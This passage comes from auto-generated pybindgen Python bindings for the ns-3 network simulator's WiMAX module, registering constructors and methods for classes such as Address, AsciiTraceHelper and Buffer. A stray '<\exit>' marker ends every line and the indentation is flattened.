register_Ns3PcapHelper_methods(root_module, root_module['ns3::PcapHelper'])<\exit>
register_Ns3PcapHelperForDevice_methods(root_module, root_module['ns3::PcapHelperForDevice'])<\exit>
register_Ns3RandomVariable_methods(root_module, root_module['ns3::RandomVariable'])<\exit>
register_Ns3SNRToBlockErrorRateManager_methods(root_module, root_module['ns3::SNRToBlockErrorRateManager'])<\exit>
register_Ns3SNRToBlockErrorRateRecord_methods(root_module, root_module['ns3::SNRToBlockErrorRateRecord'])<\exit>
register_Ns3SSRecord_methods(root_module, root_module['ns3::SSRecord'])<\exit>
register_Ns3SeedManager_methods(root_module, root_module['ns3::SeedManager'])<\exit>
register_Ns3SendParams_methods(root_module, root_module['ns3::SendParams'])<\exit>
register_Ns3SequentialVariable_methods(root_module, root_module['ns3::SequentialVariable'])<\exit>
register_Ns3ServiceFlow_methods(root_module, root_module['ns3::ServiceFlow'])<\exit>
register_Ns3ServiceFlowRecord_methods(root_module, root_module['ns3::ServiceFlowRecord'])<\exit>
register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])<\exit>
register_Ns3Simulator_methods(root_module, root_module['ns3::Simulator'])<\exit>
register_Ns3Tag_methods(root_module, root_module['ns3::Tag'])<\exit>
register_Ns3TagBuffer_methods(root_module, root_module['ns3::TagBuffer'])<\exit>
register_Ns3TlvValue_methods(root_module, root_module['ns3::TlvValue'])<\exit>
register_Ns3TosTlvValue_methods(root_module, root_module['ns3::TosTlvValue'])<\exit>
register_Ns3TriangularVariable_methods(root_module, root_module['ns3::TriangularVariable'])<\exit>
register_Ns3TypeId_methods(root_module, root_module['ns3::TypeId'])<\exit>
register_Ns3TypeIdAttributeInformation_methods(root_module, root_module['ns3::TypeId::AttributeInformation'])<\exit>
register_Ns3TypeIdTraceSourceInformation_methods(root_module, root_module['ns3::TypeId::TraceSourceInformation'])<\exit>
register_Ns3U16TlvValue_methods(root_module, root_module['ns3::U16TlvValue'])<\exit>
register_Ns3U32TlvValue_methods(root_module, root_module['ns3::U32TlvValue'])<\exit>
register_Ns3U8TlvValue_methods(root_module, root_module['ns3::U8TlvValue'])<\exit>
register_Ns3UcdChannelEncodings_methods(root_module, root_module['ns3::UcdChannelEncodings'])<\exit>
register_Ns3UniformVariable_methods(root_module, root_module['ns3::UniformVariable'])<\exit>
register_Ns3VectorTlvValue_methods(root_module, root_module['ns3::VectorTlvValue'])<\exit>
register_Ns3WeibullVariable_methods(root_module, root_module['ns3::WeibullVariable'])<\exit>
register_Ns3WimaxHelper_methods(root_module, root_module['ns3::WimaxHelper'])<\exit>
register_Ns3ZetaVariable_methods(root_module, root_module['ns3::ZetaVariable'])<\exit>
register_Ns3ZipfVariable_methods(root_module, root_module['ns3::ZipfVariable'])<\exit>
register_Ns3Empty_methods(root_module, root_module['ns3::empty'])<\exit>
register_Ns3Int64x64_t_methods(root_module, root_module['ns3::int64x64_t'])<\exit>
register_Ns3SimpleOfdmSendParam_methods(root_module, root_module['ns3::simpleOfdmSendParam'])<\exit>
register_Ns3Chunk_methods(root_module, root_module['ns3::Chunk'])<\exit>
register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, root_module['ns3::ClassificationRuleVectorTlvValue'])<\exit>
register_Ns3ConstantVariable_methods(root_module, root_module['ns3::ConstantVariable'])<\exit>
register_Ns3CsParamVectorTlvValue_methods(root_module, root_module['ns3::CsParamVectorTlvValue'])<\exit>
register_Ns3DeterministicVariable_methods(root_module, root_module['ns3::DeterministicVariable'])<\exit>
register_Ns3EmpiricalVariable_methods(root_module, root_module['ns3::EmpiricalVariable'])<\exit>
register_Ns3ErlangVariable_methods(root_module, root_module['ns3::ErlangVariable'])<\exit>
register_Ns3ExponentialVariable_methods(root_module, root_module['ns3::ExponentialVariable'])<\exit>
register_Ns3GammaVariable_methods(root_module, root_module['ns3::GammaVariable'])<\exit>
register_Ns3Header_methods(root_module, root_module['ns3::Header'])<\exit>
register_Ns3IntEmpiricalVariable_methods(root_module, root_module['ns3::IntEmpiricalVariable'])<\exit>
register_Ns3Ipv4AddressTlvValue_methods(root_module, root_module['ns3::Ipv4AddressTlvValue'])<\exit>
register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, root_module['ns3::Ipv4AddressTlvValue::ipv4Addr'])<\exit>
register_Ns3LogNormalVariable_methods(root_module, root_module['ns3::LogNormalVariable'])<\exit>
register_Ns3MacHeaderType_methods(root_module, root_module['ns3::MacHeaderType'])<\exit>
register_Ns3ManagementMessageType_methods(root_module, root_module['ns3::ManagementMessageType'])<\exit>
register_Ns3NormalVariable_methods(root_module, root_module['ns3::NormalVariable'])<\exit>
register_Ns3Object_methods(root_module, root_module['ns3::Object'])<\exit>
register_Ns3ObjectAggregateIterator_methods(root_module, root_module['ns3::Object::AggregateIterator'])<\exit>
register_Ns3OfdmDownlinkFramePrefix_methods(root_module, root_module['ns3::OfdmDownlinkFramePrefix'])<\exit>
register_Ns3OfdmSendParams_methods(root_module, root_module['ns3::OfdmSendParams'])<\exit>
register_Ns3OfdmUcdChannelEncodings_methods(root_module, root_module['ns3::OfdmUcdChannelEncodings'])<\exit>
register_Ns3PacketBurst_methods(root_module, root_module['ns3::PacketBurst'])<\exit>
register_Ns3ParetoVariable_methods(root_module, root_module['ns3::ParetoVariable'])<\exit>
register_Ns3PcapFileWrapper_methods(root_module, root_module['ns3::PcapFileWrapper'])<\exit>
register_Ns3PortRangeTlvValue_methods(root_module, root_module['ns3::PortRangeTlvValue'])<\exit>
register_Ns3PortRangeTlvValuePortRange_methods(root_module, root_module['ns3::PortRangeTlvValue::PortRange'])<\exit>
register_Ns3PriorityUlJob_methods(root_module, root_module['ns3::PriorityUlJob'])<\exit>
register_Ns3PropagationLossModel_methods(root_module, root_module['ns3::PropagationLossModel'])<\exit>
register_Ns3ProtocolTlvValue_methods(root_module, root_module['ns3::ProtocolTlvValue'])<\exit>
register_Ns3RandomPropagationLossModel_methods(root_module, root_module['ns3::RandomPropagationLossModel'])<\exit>
register_Ns3RangePropagationLossModel_methods(root_module, root_module['ns3::RangePropagationLossModel'])<\exit>
register_Ns3RngReq_methods(root_module, root_module['ns3::RngReq'])<\exit>
register_Ns3RngRsp_methods(root_module, root_module['ns3::RngRsp'])<\exit>
register_Ns3SSManager_methods(root_module, root_module['ns3::SSManager'])<\exit>
register_Ns3ServiceFlowManager_methods(root_module, root_module['ns3::ServiceFlowManager'])<\exit>
register_Ns3SfVectorTlvValue_methods(root_module, root_module['ns3::SfVectorTlvValue'])<\exit>
register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])<\exit>
register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])<\exit>
register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])<\exit>
register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])<\exit>
register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])<\exit>
register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])<\exit>
register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])<\exit>
register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])<\exit>
register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])<\exit>
register_Ns3SsServiceFlowManager_methods(root_module, root_module['ns3::SsServiceFlowManager'])<\exit>
register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, root_module['ns3::ThreeLogDistancePropagationLossModel'])<\exit>
register_Ns3Time_methods(root_module, root_module['ns3::Time'])<\exit>
register_Ns3Tlv_methods(root_module, root_module['ns3::Tlv'])<\exit>
register_Ns3TraceSourceAccessor_methods(root_module, root_module['ns3::TraceSourceAccessor'])<\exit>
register_Ns3Trailer_methods(root_module, root_module['ns3::Trailer'])<\exit>
register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, root_module['ns3::TwoRayGroundPropagationLossModel'])<\exit>
register_Ns3Ucd_methods(root_module, root_module['ns3::Ucd'])<\exit>
register_Ns3UlJob_methods(root_module, root_module['ns3::UlJob'])<\exit>
register_Ns3UlMap_methods(root_module, root_module['ns3::UlMap'])<\exit>
register_Ns3UplinkScheduler_methods(root_module, root_module['ns3::UplinkScheduler'])<\exit>
register_Ns3UplinkSchedulerMBQoS_methods(root_module, root_module['ns3::UplinkSchedulerMBQoS'])<\exit>
register_Ns3UplinkSchedulerRtps_methods(root_module, root_module['ns3::UplinkSchedulerRtps'])<\exit>
register_Ns3UplinkSchedulerSimple_methods(root_module, root_module['ns3::UplinkSchedulerSimple'])<\exit>
register_Ns3WimaxConnection_methods(root_module, root_module['ns3::WimaxConnection'])<\exit>
register_Ns3WimaxMacQueue_methods(root_module, root_module['ns3::WimaxMacQueue'])<\exit>
register_Ns3WimaxMacToMacHeader_methods(root_module, root_module['ns3::WimaxMacToMacHeader'])<\exit>
register_Ns3WimaxPhy_methods(root_module, root_module['ns3::WimaxPhy'])<\exit>
register_Ns3AttributeAccessor_methods(root_module, root_module['ns3::AttributeAccessor'])<\exit>
register_Ns3AttributeChecker_methods(root_module, root_module['ns3::AttributeChecker'])<\exit>
register_Ns3AttributeValue_methods(root_module, root_module['ns3::AttributeValue'])<\exit>
register_Ns3BSScheduler_methods(root_module, root_module['ns3::BSScheduler'])<\exit>
register_Ns3BSSchedulerRtps_methods(root_module, root_module['ns3::BSSchedulerRtps'])<\exit>
register_Ns3BSSchedulerSimple_methods(root_module, root_module['ns3::BSSchedulerSimple'])<\exit>
register_Ns3BandwidthRequestHeader_methods(root_module, root_module['ns3::BandwidthRequestHeader'])<\exit>
register_Ns3BsServiceFlowManager_methods(root_module, root_module['ns3::BsServiceFlowManager'])<\exit>
register_Ns3CallbackChecker_methods(root_module, root_module['ns3::CallbackChecker'])<\exit>
register_Ns3CallbackImplBase_methods(root_module, root_module['ns3::CallbackImplBase'])<\exit>
register_Ns3CallbackValue_methods(root_module, root_module['ns3::CallbackValue'])<\exit>
register_Ns3Channel_methods(root_module, root_module['ns3::Channel'])<\exit>
register_Ns3ConnectionManager_methods(root_module, root_module['ns3::ConnectionManager'])<\exit>
register_Ns3Dcd_methods(root_module, root_module['ns3::Dcd'])<\exit>
register_Ns3DlMap_methods(root_module, root_module['ns3::DlMap'])<\exit>
register_Ns3DsaAck_methods(root_module, root_module['ns3::DsaAck'])<\exit>
register_Ns3DsaReq_methods(root_module, root_module['ns3::DsaReq'])<\exit>
register_Ns3DsaRsp_methods(root_module, root_module['ns3::DsaRsp'])<\exit>
register_Ns3EmptyAttributeValue_methods(root_module, root_module['ns3::EmptyAttributeValue'])<\exit>
register_Ns3EventImpl_methods(root_module, root_module['ns3::EventImpl'])<\exit>
register_Ns3FixedRssLossModel_methods(root_module, root_module['ns3::FixedRssLossModel'])<\exit>
register_Ns3FragmentationSubheader_methods(root_module, root_module['ns3::FragmentationSubheader'])<\exit>
register_Ns3FriisPropagationLossModel_methods(root_module, root_module['ns3::FriisPropagationLossModel'])<\exit>
register_Ns3GenericMacHeader_methods(root_module, root_module['ns3::GenericMacHeader'])<\exit>
register_Ns3GrantManagementSubheader_methods(root_module, root_module['ns3::GrantManagementSubheader'])<\exit>
register_Ns3IpcsClassifier_methods(root_module, root_module['ns3::IpcsClassifier'])<\exit>
register_Ns3Ipv4AddressChecker_methods(root_module, root_module['ns3::Ipv4AddressChecker'])<\exit>
register_Ns3Ipv4AddressValue_methods(root_module, root_module['ns3::Ipv4AddressValue'])<\exit>
register_Ns3Ipv4MaskChecker_methods(root_module, root_module['ns3::Ipv4MaskChecker'])<\exit>
register_Ns3Ipv4MaskValue_methods(root_module, root_module['ns3::Ipv4MaskValue'])<\exit>
register_Ns3Ipv6AddressChecker_methods(root_module, root_module['ns3::Ipv6AddressChecker'])<\exit>
register_Ns3Ipv6AddressValue_methods(root_module, root_module['ns3::Ipv6AddressValue'])<\exit>
register_Ns3Ipv6PrefixChecker_methods(root_module, root_module['ns3::Ipv6PrefixChecker'])<\exit>
register_Ns3Ipv6PrefixValue_methods(root_module, root_module['ns3::Ipv6PrefixValue'])<\exit>
register_Ns3LogDistancePropagationLossModel_methods(root_module, root_module['ns3::LogDistancePropagationLossModel'])<\exit>
register_Ns3Mac48AddressChecker_methods(root_module, root_module['ns3::Mac48AddressChecker'])<\exit>
register_Ns3Mac48AddressValue_methods(root_module, root_module['ns3::Mac48AddressValue'])<\exit>
register_Ns3MatrixPropagationLossModel_methods(root_module, root_module['ns3::MatrixPropagationLossModel'])<\exit>
register_Ns3NakagamiPropagationLossModel_methods(root_module, root_module['ns3::NakagamiPropagationLossModel'])<\exit>
register_Ns3NetDevice_methods(root_module, root_module['ns3::NetDevice'])<\exit>
register_Ns3NixVector_methods(root_module, root_module['ns3::NixVector'])<\exit>
register_Ns3Node_methods(root_module, root_module['ns3::Node'])<\exit>
register_Ns3ObjectFactoryChecker_methods(root_module, root_module['ns3::ObjectFactoryChecker'])<\exit>
register_Ns3ObjectFactoryValue_methods(root_module, root_module['ns3::ObjectFactoryValue'])<\exit>
register_Ns3OutputStreamWrapper_methods(root_module, root_module['ns3::OutputStreamWrapper'])<\exit>
register_Ns3Packet_methods(root_module, root_module['ns3::Packet'])<\exit>
register_Ns3RandomVariableChecker_methods(root_module, root_module['ns3::RandomVariableChecker'])<\exit>
register_Ns3RandomVariableValue_methods(root_module, root_module['ns3::RandomVariableValue'])<\exit>
register_Ns3SimpleOfdmWimaxPhy_methods(root_module, root_module['ns3::SimpleOfdmWimaxPhy'])<\exit>
register_Ns3TimeChecker_methods(root_module, root_module['ns3::TimeChecker'])<\exit>
register_Ns3TimeValue_methods(root_module, root_module['ns3::TimeValue'])<\exit>
register_Ns3TypeIdChecker_methods(root_module, root_module['ns3::TypeIdChecker'])<\exit>
register_Ns3TypeIdValue_methods(root_module, root_module['ns3::TypeIdValue'])<\exit>
register_Ns3UintegerValue_methods(root_module, root_module['ns3::UintegerValue'])<\exit>
register_Ns3WimaxChannel_methods(root_module, root_module['ns3::WimaxChannel'])<\exit>
register_Ns3WimaxNetDevice_methods(root_module, root_module['ns3::WimaxNetDevice'])<\exit>
register_Ns3AddressChecker_methods(root_module, root_module['ns3::AddressChecker'])<\exit>
register_Ns3AddressValue_methods(root_module, root_module['ns3::AddressValue'])<\exit>
register_Ns3BaseStationNetDevice_methods(root_module, root_module['ns3::BaseStationNetDevice'])<\exit>
register_Ns3SimpleOfdmWimaxChannel_methods(root_module, root_module['ns3::SimpleOfdmWimaxChannel'])<\exit>
register_Ns3SubscriberStationNetDevice_methods(root_module, root_module['ns3::SubscriberStationNetDevice'])<\exit>
return<\exit>
def register_Ns3Address_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'type'), param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])<\exit>
cls.add_constructor([param('ns3::Address const &', 'address')])<\exit>
cls.add_method('CheckCompatible',<\exit>
'bool',<\exit>
[param('uint8_t', 'type'), param('uint8_t', 'len')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyAllFrom',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])<\exit>
cls.add_method('CopyAllTo',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint8_t', 'len')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyFrom',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])<\exit>
cls.add_method('CopyTo',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer')],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'buffer')])<\exit>
cls.add_method('GetLength',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsInvalid',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsMatchingType',<\exit>
'bool',<\exit>
[param('uint8_t', 'type')],<\exit>
is_const=True)<\exit>
cls.add_method('Register',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'buffer')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3AsciiTraceHelper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AsciiTraceHelper const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateFileStream',<\exit>
'ns3::Ptr< ns3::OutputStreamWrapper >',<\exit>
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode', default_value='std::ios_base::out')])<\exit>
cls.add_method('DefaultDequeueSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultDequeueSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultDropSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultDropSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultEnqueueSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultEnqueueSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultReceiveSinkWithContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('DefaultReceiveSinkWithoutContext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],<\exit>
is_static=True)<\exit>
cls.add_method('GetFilenameFromDevice',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])<\exit>
cls.add_method('GetFilenameFromInterfacePair',<\exit>
'std::string',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])<\exit>
return<\exit>
def register_Ns3AsciiTraceHelperForDevice_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AsciiTraceHelperForDevice const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::Ptr< ns3::NetDevice >', 'nd')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'explicitFilename', default_value='false')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'ndName')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NetDeviceContainer', 'd')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NodeContainer', 'n')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'explicitFilename')])<\exit>
cls.add_method('EnableAscii',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid')])<\exit>
cls.add_method('EnableAsciiAll',<\exit>
'void',<\exit>
[param('std::string', 'prefix')])<\exit>
cls.add_method('EnableAsciiAll',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream')])<\exit>
cls.add_method('EnableAsciiInternal',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeConstructionList_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeConstructionList const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('std::string', 'name'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker'), param('ns3::Ptr< ns3::AttributeValue >', 'value')])<\exit>
cls.add_method('Begin',<\exit>
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('End',<\exit>
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Find',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3AttributeConstructionListItem_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::AttributeConstructionList::Item const &', 'arg0')])<\exit>
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)<\exit>
cls.add_instance_attribute('name', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('value', 'ns3::Ptr< ns3::AttributeValue >', is_const=False)<\exit>
return<\exit>
def register_Ns3Buffer_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'dataSize')])<\exit>
cls.add_constructor([param('uint32_t', 'dataSize'), param('bool', 'initialize')])<\exit>
cls.add_constructor([param('ns3::Buffer const &', 'o')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'bool',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('ns3::Buffer const &', 'o')])<\exit>
cls.add_method('AddAtStart',<\exit>
'bool',<\exit>
[param('uint32_t', 'start')])<\exit>
cls.add_method('Begin',<\exit>
'ns3::Buffer::Iterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'void',<\exit>
[param('std::ostream *', 'os'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFragment',<\exit>
'ns3::Buffer',<\exit>
[param('uint32_t', 'start'), param('uint32_t', 'length')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFullCopy',<\exit>
'ns3::Buffer',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('End',<\exit>
'ns3::Buffer::Iterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCurrentEndOffset',<\exit>
'int32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCurrentStartOffset',<\exit>
'int32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekData',<\exit>
'uint8_t const *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'end')])<\exit>
cls.add_method('RemoveAtStart',<\exit>
'void',<\exit>
[param('uint32_t', 'start')])<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3BufferIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Buffer::Iterator const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CalculateIpChecksum',<\exit>
'uint16_t',<\exit>
[param('uint16_t', 'size')])<\exit>
cls.add_method('CalculateIpChecksum',<\exit>
'uint16_t',<\exit>
[param('uint16_t', 'size'), param('uint32_t', 'initialChecksum')])<\exit>
cls.add_method('GetDistanceFrom',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator const &', 'o')],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEnd',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsStart',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Next',<\exit>
'void',<\exit>
[param('uint32_t', 'delta')])<\exit>
cls.add_method('Prev',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Prev',<\exit>
'void',<\exit>
[param('uint32_t', 'delta')])<\exit>
cls.add_method('Read',<\exit>
'void',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('ReadLsbtohU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadLsbtohU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadLsbtohU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadNtohU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadNtohU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadNtohU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadU8',<\exit>
'uint8_t',<\exit>
[])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
